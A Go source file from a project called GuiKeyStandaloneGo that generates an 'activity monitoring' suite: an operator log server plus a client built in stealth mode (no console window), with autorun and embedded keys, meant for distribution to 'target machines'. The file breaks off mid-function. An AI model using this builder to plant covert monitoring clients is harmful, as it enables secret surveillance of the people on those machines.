// File: GuiKeyStandaloneGo/generator/core/generate.go
package core

import (
	"bytes"
	"fmt"
	"html/template"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv" // For port conversion
	"strings"
	"time"

	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/config"
	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/crypto"

	"github.com/libp2p/go-libp2p/core/peer"
)

type GeneratorSettings struct {
	OutputDirPath         string
	BootstrapAddresses    string
	ServerExplicitP2PPort string // GUI will pass this as string, needs validation
	ClientConfigOverrides config.ClientSettings
	ServerConfigOverrides config.ServerSettings // Keep this if you plan to add more server overrides
	GoExecutablePath      string
	TemplatesBasePath     string
	TempModuleRootPath    string
	ProgressCallback      func(message string, percentage int)
}

type GeneratedInfo struct {
	AppClientID           string
	AppEncryptionKeyHex   string
	ServerPeerID          string
	ServerIdentitySeedHex string
	ReadmeContent         string
	FullOutputDir         string
}

const readmeTemplate = `Activity Monitoring Suite - Generated Packages (P2P Mode)
========================================================

This package was generated by the GuiKeyStandaloneGo Generator on {{.Timestamp}}.

Generated App-Level Client ID (for logs): {{.Generated.AppClientID}}
Generated App-Level Encryption Key (Hex): {{.Generated.AppEncryptionKeyHex}}
Generated Server Libp2p Peer ID: {{.Generated.ServerPeerID}}
Generated Server Libp2p Identity Seed (Hex): {{.Generated.ServerIdentitySeedHex}}

Instructions:
------------

1. Local Log Server (For Your Machine - The Operator):
   - The 'LocalLogServer_Package' directory contains the server application and its configuration.
   - It also contains 'web_templates' and 'static' subdirectories for the UI.
   - Run '{{.ServerExeName}}' from within this directory.
   {{if .ServerConfig.ExplicitP2PPort}}
   Configured Specific P2P Listen Port (TCP): {{.ServerConfig.GetExplicitP2PPortValue}}
   The server will also attempt to listen on dynamic QUIC ports for flexibility.

   **!! IMPORTANT FOR PUBLIC ACCESS !!**
   Since you specified a P2P port ({{.ServerConfig.GetExplicitP2PPortValue}}), for clients outside your local network (Internet)
   to reliably connect directly, you likely NEED TO CONFIGURE PORT FORWARDING on your router:
     1. Access your router's administration page (usually an IP like 192.168.1.1 or 192.168.0.1).
     2. Find the "Port Forwarding", "Virtual Servers", or similar section.
     3. Create a new rule with the following details:
        - External Port (or Service Port): {{.ServerConfig.GetExplicitP2PPortValue}}
        - Internal Port: {{.ServerConfig.GetExplicitP2PPortValue}} (same as external)
        - Internal IP Address: The local IP address of the machine running this server
                               (e.g., 192.168.1.100 - find this in your OS network settings).
        - Protocol: TCP
        - Enable or Activate the rule.
     4. After saving, clients from the internet should be able to reach your server.
        If issues persist, ensure your server machine's firewall allows incoming connections for '{{.ServerExeName}}'.

   Libp2p will still attempt UPnP/NAT-PMP for automatic port mapping.
   Check server logs for "Reachability status changed to: Public" for confirmation.
   If it remains "Private" despite UPnP being enabled on your router, manual port forwarding for the port above is highly recommended.
   {{else}}
   Server P2P Listen Addresses: Libp2p will attempt to listen on dynamic TCP and QUIC ports
                                (e.g., /ip4/0.0.0.0/tcp/0, /ip4/0.0.0.0/udp/0/quic-v1).
   It will try to use UPnP/NAT-PMP to automatically map ports on your router.
   Check server logs for its actual listening addresses and "Reachability status".
   If status is "Private" and internet clients cannot connect, you may need to:
     a) Enable UPnP/NAT-PMP on your router (if available and supported).
     b) Re-generate server with a specific P2P port (see generator options) and then set up manual port forwarding on your router for that port.
   {{end}}
   Server Web UI Listen Address: {{.ServerConfig.WebUIListenAddress}}
   - Access Web UI at: http://{{.WebUIAccessAddress}}/logs
   - Server Bootstrap Addresses: {{range .ServerConfig.BootstrapAddresses}}{{.}} {{end}}
   - Server Diagnostic Log File: {{.ServerConfig.InternalLogFileDir}}/{{.ServerConfig.InternalLogFileName}} (Level: {{.ServerConfig.InternalLogLevel}})
     (Rotation: MaxSize={{.ServerConfigMaxDiagnosticLogSizeMBOrDefault}}MB, Backups={{.ServerConfigMaxDiagnosticLogBackupsOrDefault}}, MaxAge={{.ServerConfigMaxDiagnosticLogAgeDaysOrDefault}}days)

2. Activity Monitor Client (For Distribution to Target Machines):
   - The 'ActivityMonitorClient_Package' directory contains the client application.
   - Distribute the *contents* of this directory to the machine(s) you want to monitor.
   - Run '{{.ClientExeName}}' on the target machine(s).
   - It is configured to connect to Server Peer ID: {{.Generated.ServerPeerID}}
   - It will use these bootstrap multiaddresses: {{range .ClientConfig.BootstrapAddresses}}{{.}} {{end}}
   - Client Diagnostic Log File: {{.ClientConfig.InternalLogFileDir}}/{{.ClientConfig.InternalLogFileName}} (Level: {{.ClientConfig.InternalLogLevel}})
     (Rotation: MaxSize={{.ClientConfigMaxLogFileSizeMBOrDefault}}MB, Backups={{.ClientConfigMaxDiagnosticLogBackupsOrDefault}}, MaxAge={{.ClientConfigMaxDiagnosticLogAgeDaysOrDefault}}days)
   - Client Local Cache DB (SQLite): {{.ClientConfig.LogFilePath}} 
     (This SQLite DB is also size-managed based on the MaxLogFileSizeMB setting, aiming for ~{{.ClientConfigMaxLogFileSizeMBOrDefault}}MB before aggressive pruning)

Security Considerations:
- The app-level encryption key is vital for data confidentiality. Keep it secure.
- The server's libp2p identity seed is critical.
- Secure the machine running the Local Log Server. This includes configuring its OS firewall to allow incoming connections for '{{.ServerExeName}}'.
- Ensure proper consent and adhere to privacy laws when deploying the client monitor.
`

const clientGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main 

const (
	CfgServerPeerID                       = "{{.ServerPeerID}}"
	CfgEncryptionKeyHex                   = "{{.EncryptionKeyHex}}"
	CfgClientID                           = "{{.ClientID}}"
	CfgSyncIntervalSecs                   = {{.SyncIntervalSecs}}
	CfgProcessorPeriodicFlushIntervalSecs = {{.ProcessorPeriodicFlushIntervalSecs}}
	CfgInternalLogLevel                   = "{{.InternalLogLevel}}"
	CfgLogFilePath                        = ` + "`{{.LogFilePath}}`" + `
	CfgAppNameForAutorun                  = "{{.AppNameForAutorun}}"
	CfgLocalLogCacheRetentionDays         = {{.LocalLogCacheRetentionDays}}
	CfgRetryIntervalOnFailSecs            = {{.RetryIntervalOnFailSecs}}
	CfgMaxRetriesPerBatch                 = {{.MaxRetriesPerBatch}}
	CfgMaxEventsPerSyncBatch              = {{.MaxEventsPerSyncBatch}}
	CfgInternalLogFileDir                 = ` + "`{{.InternalLogFileDir}}`" + `
	CfgInternalLogFileName                = "{{.InternalLogFileName}}"
)

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}

{{if .MaxLogFileSizeMBIsSet}}
var CfgMaxLogFileSizeMBValue = uint64({{.MaxLogFileSizeMBValue}})
var CfgMaxLogFileSizeMB = &CfgMaxLogFileSizeMBValue 
{{else}}
var CfgMaxLogFileSizeMB *uint64 = nil
{{end}}

{{if .MaxDiagnosticLogSizeMBIsSet}}
const CfgDiagnosticLogMaxSizeMB = {{.MaxDiagnosticLogSizeMBValue}}
{{else}}
const CfgDiagnosticLogMaxSizeMB = 10 
{{end}}
{{if .MaxDiagnosticLogBackupsIsSet}}
const CfgDiagnosticLogMaxBackups = {{.MaxDiagnosticLogBackupsValue}}
{{else}}
const CfgDiagnosticLogMaxBackups = 3
{{end}}
{{if .MaxDiagnosticLogAgeDaysIsSet}}
const CfgDiagnosticLogMaxAgeDays = {{.MaxDiagnosticLogAgeDaysValue}}
{{else}}
const CfgDiagnosticLogMaxAgeDays = 7
{{end}}
`

// SERVER GENERATED CONFIG TEMPLATE
// This template will be written to server_template/config_generated.go
const serverGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main

const (
	// CfgP2PListenAddress is not a const here; it's determined by the server's
	// P2P manager based on CfgExplicitP2PPort.
	CfgWebUIListenAddress          = "{{.WebUIListenAddress}}"
	CfgEncryptionKeyHex            = "{{.EncryptionKeyHex}}"
	CfgServerIdentityKeySeedHex    = "{{.ServerIdentityKeySeedHex}}"
	CfgDatabasePath                = ` + "`{{.DatabasePath}}`" + `
	CfgLogRetentionDays            = {{.LogRetentionDays}}
	CfgLogDeletionCheckIntervalHrs = {{.LogDeletionCheckIntervalHrs}}
	CfgInternalLogLevel            = "{{.InternalLogLevel}}"      
	CfgInternalLogFileDir          = ` + "`{{.InternalLogFileDir}}`" + `   
	CfgInternalLogFileName         = "{{.InternalLogFileName}}"      
)

// CfgExplicitP2PPort: if 0, server P2P manager will use dynamic ports.
// Otherwise, it will attempt to use this specific TCP port for P2P.
// Dynamic QUIC ports will still be added.
{{if .ExplicitP2PPortIsSet}}
const CfgExplicitP2PPortValue uint16 = {{.ExplicitP2PPortValue}}
var CfgExplicitP2PPort uint16 = CfgExplicitP2PPortValue
{{else}}
var CfgExplicitP2PPort uint16 = 0 // 0 means dynamic port for TCP
{{end}}

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}

// For diagnostic text log rotation (using lumberjack)
{{if .MaxDiagnosticLogSizeMBIsSet}}
const CfgDiagnosticLogMaxSizeMB = {{.MaxDiagnosticLogSizeMBValue}}
{{else}}
const CfgDiagnosticLogMaxSizeMB = 20
{{end}}
{{if .MaxDiagnosticLogBackupsIsSet}}
const CfgDiagnosticLogMaxBackups = {{.MaxDiagnosticLogBackupsValue}}
{{else}}
const CfgDiagnosticLogMaxBackups = 5
{{end}}
{{if .MaxDiagnosticLogAgeDaysIsSet}}
const CfgDiagnosticLogMaxAgeDays = {{.MaxDiagnosticLogAgeDaysValue}}
{{else}}
const CfgDiagnosticLogMaxAgeDays = 14
{{end}}
`

func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
	var genInfo GeneratedInfo
	if genSettings.ProgressCallback == nil {
		genSettings.ProgressCallback = func(message string, percentage int) {
			log.Printf("[core-progress %d%%] %s", percentage, message)
		}
	}

	genSettings.ProgressCallback("Starting generation process...", 0)
	log.Println("[core] PerformGeneration started.")

	if genSettings.OutputDirPath == "" {
		return genInfo, fmt.Errorf("output directory is not set")
	}
	// ... (other initial checks for GoExecutablePath, TemplatesBasePath, TempModuleRootPath) ...

	absOutputDir, err := filepath.Abs(genSettings.OutputDirPath)
	if err != nil {
		return genInfo, fmt.Errorf("failed to get absolute path for output directory %s: %w", genSettings.OutputDirPath, err)
	}
	genInfo.FullOutputDir = absOutputDir
	if err := os.MkdirAll(absOutputDir, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create output directory %s: %w", absOutputDir, err)
	}
	genSettings.ProgressCallback(fmt.Sprintf("Output directory ensured at %s", absOutputDir), 5)
	log.Printf("[core] Output directory: %s", absOutputDir)

	genInfo.AppClientID = crypto.GenerateAppClientID()
	aesKeyBytes, err := crypto.GenerateAESKeyBytes()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate AES key: %w", err)
	}
	genInfo.AppEncryptionKeyHex = fmt.Sprintf("%x", aesKeyBytes)
	genSettings.ProgressCallback("App Client ID and Encryption Key generated.", 10)

	serverIdentitySeedHex, err := crypto.GenerateLibp2pIdentitySeedHex()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate server identity seed: %w", err)
	}
	genInfo.ServerIdentitySeedHex = serverIdentitySeedHex
	serverPrivKey, _, err := crypto.Libp2pKeyFromSeedHex(serverIdentitySeedHex)
	if err != nil {
		return genInfo, fmt.Errorf("failed to derive server libp2p key: %w", err)
	}
	serverPID, err := peer.IDFromPrivateKey(serverPrivKey)
	if err != nil {
		return genInfo, fmt.Errorf("failed to get server peer ID: %w", err)
	}
	genInfo.ServerPeerID = serverPID.String()
	genSettings.ProgressCallback(fmt.Sprintf("Server Peer ID (%s) and Identity Seed generated.", genInfo.ServerPeerID), 15)
	log.Printf("[core] Generated Server Peer ID: %s", genInfo.ServerPeerID)

	// Prepare Client Configuration
	clientCfgValues := config.DefaultClientSettings()
	clientCfgValues.ClientID = genInfo.AppClientID
	clientCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	clientCfgValues.ServerPeerID = genInfo.ServerPeerID
	if genSettings.BootstrapAddresses != "" {
		addrs := strings.FieldsFunc(genSettings.BootstrapAddresses, func(r rune) bool { return r == ',' || r == '\n' })
		clientCfgValues.BootstrapAddresses = make([]string, 0, len(addrs))
		for _, addr := range addrs {
			trimmedAddr := strings.TrimSpace(addr)
			if trimmedAddr != "" {
				clientCfgValues.BootstrapAddresses = append(clientCfgValues.BootstrapAddresses, trimmedAddr)
			}
		}
	}
	if genSettings.ClientConfigOverrides.MaxLogFileSizeMB != nil {
		clientCfgValues.MaxLogFileSizeMB = genSettings.ClientConfigOverrides.MaxLogFileSizeMB
	}
	// ... (other client overrides if any)
	genSettings.ProgressCallback("Client configuration values prepared.", 20)

	// Prepare Server Configuration
	serverCfgValues := config.DefaultServerSettings()
	serverCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	serverCfgValues.ServerIdentityKeySeedHex = genInfo.ServerIdentitySeedHex
	if len(clientCfgValues.BootstrapAddresses) > 0 { // Server uses same bootstrap addresses as client by default
		serverCfgValues.BootstrapAddresses = make([]string, len(clientCfgValues.BootstrapAddresses))
		copy(serverCfgValues.BootstrapAddresses, clientCfgValues.BootstrapAddresses)
	} else {
		serverCfgValues.BootstrapAddresses = []string{}
	}

	// Apply ServerExplicitP2PPort from GeneratorSettings
	if genSettings.ServerExplicitP2PPort != "" {
		portVal, errPort := strconv.ParseUint(genSettings.ServerExplicitP2PPort, 10, 16)
		if errPort == nil && portVal > 0 && portVal <= 65535 {
			p := uint16(portVal)
			serverCfgValues.ExplicitP2PPort = &p
			log.Printf("[core] Server configuration will use explicit P2P port: %d", p)
		} else {
			log.Printf("[core] WARNING: Invalid ServerExplicitP2PPort '%s' provided: %v. Server will use dynamic P2P port.", genSettings.ServerExplicitP2PPort, errPort)
			serverCfgValues.ExplicitP2PPort = nil // Fallback to dynamic
		}
	} else {
		serverCfgValues.ExplicitP2PPort = nil // Dynamic port if not specified
		log.Println("[core] Server configuration will use dynamic P2P port (no explicit port specified).")
	}
	// ... (other server overrides if any)
	genSettings.ProgressCallback("Server configuration values prepared.", 25)

	// ... (Path definitions for clientSrcPath, serverSrcPath, clientPackagePath, serverPackagePath) ...
	// Ensure these are correct as per your project structure
	clientSrcPath := filepath.Join(genSettings.TemplatesBasePath, "client_template")
	serverSrcPath := filepath.Join(genSettings.TemplatesBasePath, "server_template")

	log.Printf("[core] Using TemplatesBasePath from settings: %s", genSettings.TemplatesBasePath)
	log.Printf("[core] Resolved client_template source path for build: %s", clientSrcPath)
	log.Printf("[core] Resolved server_template source path for build: %s", serverSrcPath)

	if _, errStat := os.Stat(clientSrcPath); os.IsNotExist(errStat) {
		return genInfo, fmt.Errorf("client template source path does not exist: '%s'", clientSrcPath)
	}
	if _, errStat := os.Stat(serverSrcPath); os.IsNotExist(errStat) {
		return genInfo, fmt.Errorf("server template source path does not exist: '%s'", serverSrcPath)
	}

	clientExeName := "activity_monitor_client.exe"
	serverExeName := "local_log_server.exe"

	clientPackagePath := filepath.Join(absOutputDir, "ActivityMonitorClient_Package")
	serverPackagePath := filepath.Join(absOutputDir, "LocalLogServer_Package")

	if err := os.MkdirAll(clientPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create client package dir: %w", err)
	}
	if err := os.MkdirAll(serverPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create server package dir: %w", err)
	}
	genSettings.ProgressCallback("Package directories created.", 30)

	// Prepare Client Template Data
	clientTemplateData := struct {
		config.ClientSettings
		MaxLogFileSizeMBIsSet        bool
		MaxLogFileSizeMBValue        uint64
		MaxDiagnosticLogSizeMBIsSet  bool
		MaxDiagnosticLogSizeMBValue  uint64
		MaxDiagnosticLogBackupsIsSet bool
		MaxDiagnosticLogBackupsValue int
		MaxDiagnosticLogAgeDaysIsSet bool
		MaxDiagnosticLogAgeDaysValue int
	}{ClientSettings: clientCfgValues}
	// ... (set MaxLogFileSizeMBIsSet, etc. for clientTemplateData as before) ...
	if clientCfgValues.MaxLogFileSizeMB != nil {
		clientTemplateData.MaxLogFileSizeMBIsSet = true
		clientTemplateData.MaxLogFileSizeMBValue = *clientCfgValues.MaxLogFileSizeMB
		clientTemplateData.MaxDiagnosticLogSizeMBIsSet = true // Assuming diagnostic log size uses same value
		clientTemplateData.MaxDiagnosticLogSizeMBValue = *clientCfgValues.MaxLogFileSizeMB
	}
	if clientCfgValues.MaxDiagnosticLogBackups != nil {
		clientTemplateData.MaxDiagnosticLogBackupsIsSet = true
		clientTemplateData.MaxDiagnosticLogBackupsValue = *clientCfgValues.MaxDiagnosticLogBackups
	}
	if clientCfgValues.MaxDiagnosticLogAgeDays != nil {
		clientTemplateData.MaxDiagnosticLogAgeDaysIsSet = true
		clientTemplateData.MaxDiagnosticLogAgeDaysValue = *clientCfgValues.MaxDiagnosticLogAgeDays
	}

	clientGeneratedGoPath := filepath.Join(clientSrcPath, "config_generated.go")
	if err := writeGoConfig(clientGeneratedGoPath, clientGeneratedConfigTemplate, clientTemplateData); err != nil {
		return genInfo, fmt.Errorf("failed to write client_generated_config.go: %w", err)
	}
	genSettings.ProgressCallback("Client Go config file generated.", 35)
	log.Printf("[core] Wrote client config to: %s", clientGeneratedGoPath)

	// Prepare Server Template Data
	serverTemplateData := struct {
		config.ServerSettings               // Embed the whole struct
		ExplicitP2PPortIsSet         bool   // For template logic: {{if .ExplicitP2PPortIsSet}}
		ExplicitP2PPortValue         uint16 // For template logic: const CfgP2PPort = {{.ExplicitP2PPortValue}}
		MaxDiagnosticLogSizeMBIsSet  bool
		MaxDiagnosticLogSizeMBValue  uint64
		MaxDiagnosticLogBackupsIsSet bool
		MaxDiagnosticLogBackupsValue int
		MaxDiagnosticLogAgeDaysIsSet bool
		MaxDiagnosticLogAgeDaysValue int
	}{ServerSettings: serverCfgValues}

	if serverCfgValues.ExplicitP2PPort != nil {
		serverTemplateData.ExplicitP2PPortIsSet = true
		serverTemplateData.ExplicitP2PPortValue = *serverCfgValues.ExplicitP2PPort
	}
	if serverCfgValues.MaxDiagnosticLogSizeMB != nil {
		serverTemplateData.MaxDiagnosticLogSizeMBIsSet = true
		serverTemplateData.MaxDiagnosticLogSizeMBValue = *serverCfgValues.MaxDiagnosticLogSizeMB
	}
	if serverCfgValues.MaxDiagnosticLogBackups != nil {
		serverTemplateData.MaxDiagnosticLogBackupsIsSet = true
		serverTemplateData.MaxDiagnosticLogBackupsValue = *serverCfgValues.MaxDiagnosticLogBackups
	}
	if serverCfgValues.MaxDiagnosticLogAgeDays != nil {
		serverTemplateData.MaxDiagnosticLogAgeDaysIsSet = true
		serverTemplateData.MaxDiagnosticLogAgeDaysValue = *serverCfgValues.MaxDiagnosticLogAgeDays
	}

	serverGeneratedGoPath := filepath.Join(serverSrcPath, "config_generated.go")
	if err := writeGoConfig(serverGeneratedGoPath, serverGeneratedConfigTemplate, serverTemplateData); err != nil {
		return genInfo, fmt.Errorf("failed to write server_generated_config.go: %w", err)
	}
	genSettings.ProgressCallback("Server Go config file generated.", 40)
	log.Printf("[core] Wrote server config to: %s", serverGeneratedGoPath)

	// Defer removal of generated config files
	defer func() {
		log.Printf("[core] Attempting to remove temporary config file: %s", clientGeneratedGoPath)
		if errRem := os.Remove(clientGeneratedGoPath); errRem != nil && !os.IsNotExist(errRem) {
			log.Printf("[core] WARNING: Failed to remove client_generated_config.go: %v", errRem)
		}
		log.Printf("[core] Attempting to remove temporary config file: %s", serverGeneratedGoPath)
		if errRem := os.Remove(serverGeneratedGoPath); errRem != nil && !os.IsNotExist(errRem) {
			log.Printf("[core] WARNING: Failed to remove server_generated_config.go: %v", errRem)
		}
		genSettings.ProgressCallback("Cleaned up temporary Go config files.", 98)
	}()

	clientOutPath := filepath.Join(clientPackagePath, clientExeName)
	serverOutPath := filepath.Join(serverPackagePath, serverExeName)

	genSettings.ProgressCallback("Ensuring module dependencies (go mod tidy)...", 42)
	if err := runGoModTidy(genSettings.TempModuleRootPath, genSettings.GoExecutablePath); err != nil {
		return genInfo, fmt.Errorf("failed to run 'go mod tidy': %w", err)
	}
	genSettings.ProgressCallback("Module dependencies ensured.", 45)

	genSettings.ProgressCallback(fmt.Sprintf("Compiling client template from %s...", clientSrcPath), 45)
	if err := compileGoTemplate(clientSrcPath, clientOutPath, true, genSettings.GoExecutablePath); err != nil {
		return genInfo, fmt.Errorf("failed to compile client template: %w", err)
	}
	genSettings.ProgressCallback("Client template compiled.", 60)

	genSettings.ProgressCallback(fmt.Sprintf("Compiling server template from %s...", serverSrcPath), 65)
	if err := compileGoTemplate(serverSrcPath, serverOutPath, false, genSettings.GoExecutablePath); err != nil {
		return genInfo, fmt.Errorf("failed to compile server template: %w", err)
	}
	genSettings.ProgressCallback("Server template compiled.", 80)

	// Copy server UI assets
	serverPackageStaticDir := filepath.Join(serverPackagePath, "static")
	serverPackageTemplatesDir := filepath.Join(serverPackagePath, "web_templates")
	sourceStaticDir := filepath.Join(serverSrcPath, "static")
	sourceWebTemplatesDir := filepath.Join(serverSrcPath, "web_templates")

	if err := copyDir(sourceStaticDir, serverPackageStaticDir); err != nil {
		log.Printf("[core] Warning: Failed to copy server static assets from %s: %v", sourceStaticDir, err)
	}
	if err := copyDir(sourceWebTemplatesDir, serverPackageTemplatesDir); err != nil {
		log.Printf("[core] Warning: Failed to copy server HTML templates from %s: %v", sourceWebTemplatesDir, err)
	}
	genSettings.ProgressCallback("Server UI assets copied.", 85)

	// Prepare README data
	readmeData := struct {
		Timestamp                                    string
		Generated                                    GeneratedInfo
		ClientConfig                                 config.ClientSettings
		ServerConfig                                 config.ServerSettings // Pass the whole struct
		ClientExeName                                string
		ServerExeName                                string
		WebUIAccessAddress                           string
		ClientConfigMaxLogFileSizeMBOrDefault        uint64
		ClientConfigMaxDiagnosticLogBackupsOrDefault int
		ClientConfigMaxDiagnosticLogAgeDaysOrDefault int
		ServerConfigMaxDiagnosticLogSizeMBOrDefault  uint64
		ServerConfigMaxDiagnosticLogBackupsOrDefault int
		ServerConfigMaxDiagnosticLogAgeDaysOrDefault int
	}{
		Timestamp:                             time.Now().Format(time.RFC1123),
		Generated:                             genInfo,
		ClientConfig:                          clientCfgValues,
		ServerConfig:                          serverCfgValues, // Pass the struct for template to use its methods
		ClientExeName:                         clientExeName,
		ServerExeName:                         serverExeName,
		WebUIAccessAddress:                    strings.Replace(serverCfgValues.WebUIListenAddress, "0.0.0.0", "127.0.0.1", 1),
		ClientConfigMaxLogFileSizeMBOrDefault: clientCfgValues.GetMaxLogFileSizeMBOrDefault(),
		ClientConfigMaxDiagnosticLogBackupsOrDefault: clientCfgValues.GetMaxDiagnosticLogBackupsOrDefault(),
		ClientConfigMaxDiagnosticLogAgeDaysOrDefault: clientCfgValues.GetMaxDiagnosticLogAgeDaysOrDefault(),
		ServerConfigMaxDiagnosticLogSizeMBOrDefault:  serverCfgValues.GetMaxDiagnosticLogSizeMBOrDefault(),
		ServerConfigMaxDiagnosticLogBackupsOrDefault: serverCfgValues.GetMaxDiagnosticLogBackupsOrDefault(),
		ServerConfigMaxDiagnosticLogAgeDaysOrDefault: serverCfgValues.GetMaxDiagnosticLogAgeDaysOrDefault(),
	}

	tmplReadme, err := template.New("readme").Parse(readmeTemplate)
	if err != nil {
		return genInfo, fmt.Errorf("failed to parse README template: %w", err)
	}
	var readmeBuf bytes.Buffer
	if err := tmplReadme.Execute(&readmeBuf, readmeData); err != nil {
		return genInfo, fmt.Errorf("failed to execute README template to buffer: %w", err)
	}
	genInfo.ReadmeContent = readmeBuf.String()

	readmeFilePath := filepath.Join(absOutputDir, "README_IMPORTANT_INSTRUCTIONS.txt")
	if err := os.WriteFile(readmeFilePath, readmeBuf.Bytes(), 0644); err != nil {
		return genInfo, fmt.Errorf("failed to write README content to file: %w", err)
	}
	genSettings.ProgressCallback("README generated.", 95)
	log.Printf("[core] Wrote README to: %s", readmeFilePath)

	finalMsg := fmt.Sprintf("Generation process completed successfully! Packages in: %s", absOutputDir)
	genSettings.ProgressCallback(finalMsg, 100)
	log.Printf("[core] %s", finalMsg)
	return genInfo, nil
}

func writeGoConfig(path string, goTemplateContent string, cfgData interface{}) error {
	tmpl, err := template.New("goconfig").Parse(goTemplateContent)
	if err != nil {
		return fmt.Errorf("parsing Go config template for %s: %w", filepath.Base(path), err)
	}
	parentDir := filepath.Dir(path)
	if err := os.MkdirAll(parentDir, 0755); err != nil {
		log.Printf("[core] Info: Attempted to create parent dir %s for generated Go config (might already exist or path is wrong)", parentDir)
	}
	file, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("creating generated Go config file %s: %w", path, err)
	}
	defer file.Close()
	if err := tmpl.Execute(file, cfgData); err != nil {
		return fmt.Errorf("executing Go config template for %s: %w", filepath.Base(path), err)
	}
	return nil
}

func runGoModTidy(moduleDir string, goExecutable string) error {
	effectiveGoExecutable := goExecutable
	if effectiveGoExecutable == "" {
		effectiveGoExecutable = "go"
		log.Printf("[core-gomod] GoExecutablePath not provided, defaulting to '%s' from PATH for 'go mod tidy'", effectiveGoExecutable)
	}

	cmd := exec.Command(effectiveGoExecutable, "mod", "tidy")
	cmd.Dir = moduleDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0", "GOPROXY=direct") // Added GOPROXY=direct

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	log.Printf("[core-gomod] Running 'go mod tidy': %s mod tidy (Env: GOOS=%s GOARCH=%s CGO_ENABLED=%s GOPROXY=%s) in %s",
		effectiveGoExecutable,
		buildEnvValueFor("GOOS", cmd.Env), buildEnvValueFor("GOARCH", cmd.Env),
		buildEnvValueFor("CGO_ENABLED", cmd.Env), buildEnvValueFor("GOPROXY", cmd.Env),
		cmd.Dir)

	startTime := time.Now()
	if err := cmd.Run(); err != nil {
		errMsg := fmt.Sprintf("failed to run 'go mod tidy' in %s (command: %s mod tidy): %v\nStdout: %s\nStderr: %s",
			moduleDir, effectiveGoExecutable, err, stdout.String(), stderr.String())
		log.Printf("[core-gomod] ERROR: %s", errMsg)
		return fmt.Errorf(errMsg)
	}
	duration := time.Since(startTime)
	log.Printf("[core-gomod] Successfully ran 'go mod tidy' in %s in %v. Output:\n%s", moduleDir, duration, stdout.String())
	if stderr.Len() > 0 {
		log.Printf("[core-gomod] Stderr during 'go mod tidy' in %s:\n%s", moduleDir, stderr.String())
	}
	return nil
}

func compileGoTemplate(srcDir, outputPath string, clientStealth bool, goExecutable string) error {
	effectiveGoExecutable := goExecutable
	if effectiveGoExecutable == "" {
		effectiveGoExecutable = "go"
		log.Printf("[core-compile] GoExecutablePath not provided, defaulting to '%s' from PATH for compiling %s", effectiveGoExecutable, srcDir)
	}

	args := []string{"build", "-v", "-o", outputPath}
	buildEnv := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	var ldflags []string
	if clientStealth {
		ldflags = append(ldflags, "-H=windowsgui")
	}
	ldflags = append(ldflags, "-s", "-w") // Strip symbols and DWARF, reduces binary size

	if len(ldflags) > 0 {
		args = append(args, "-ldflags="+strings.Join(ldflags, " "))
	}
	args = append(args, ".") // Build the current directory (srcDir)

	cmd := exec.Command(effectiveGoExecutable, args...)
	cmd.Dir = srcDir
	cmd.Env = buildEnv

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	log.Printf("[core-compile] Running build: %s %s (Env: GOOS=%s GOARCH=%s CGO_ENABLED=%s) in %s",
		effectiveGoExecutable, strings.Join(args, " "),
		buildEnvValueFor("GOOS", cmd.Env), buildEnvValueFor("GOARCH", cmd.Env),
		buildEnvValueFor("CGO_ENABLED", cmd.Env),
		cmd.Dir)

	startTime := time.Now()
	if err := cmd.Run(); err != nil {
		errMsg := fmt.Sprintf("failed to compile %s (command: %s %s): %v\nStdout: %s\nStderr: %s",
			filepath.Base(srcDir), effectiveGoExecutable, strings.Join(args, " "), err, stdout.String(), stderr.String())
		log.Printf("[core-compile] ERROR: %s", errMsg)
		return fmt.Errorf(errMsg)
	}
	duration := time.Since(startTime)
	log.Printf("[core-compile] Successfully compiled %s to %s in %v. Output:\n%s", filepath.Base(srcDir), outputPath, duration, stdout.String())
	if stderr.Len() > 0 {
		log.Printf("[core-compile] Stderr during compilation of %s:\n%s", filepath.Base(srcDir), stderr.String())
	}
	return nil
}

func buildEnvValueFor(key string, env []string) string {
	prefix := key + "="
	for _, entry := range env {
		if strings.HasPrefix(entry, prefix) {
			return entry[len(prefix):]
		}
	}
	return ""
}

func copyDir(src string, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		if os.IsNotExist(err) {
			log.Printf("[core-copy] Info: Source directory %s does not exist, skipping copy.", src)
			return nil // Not an error if source doesn't exist, might be optional
		}
		return fmt.Errorf("stating source dir %s: %w", src, err)
	}
	if !srcInfo.IsDir() {
		return fmt.Errorf("source %s is not a directory", src)
	}

	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return fmt.Errorf("creating dest dir %s: %w", dst, err)
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return fmt.Errorf("reading source dir %s: %w", src, err)
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err // Propagate error
			}
		} else {
			// Copy file content
			srcFile, errF := os.Open(srcPath)
			if errF != nil {
				return fmt.Errorf("opening source file %s: %w", srcPath, errF)
			}
			// Ensure dstFile is closed if created
			dstFile, errC := os.Create(dstPath)
			if errC != nil {
				srcFile.Close()
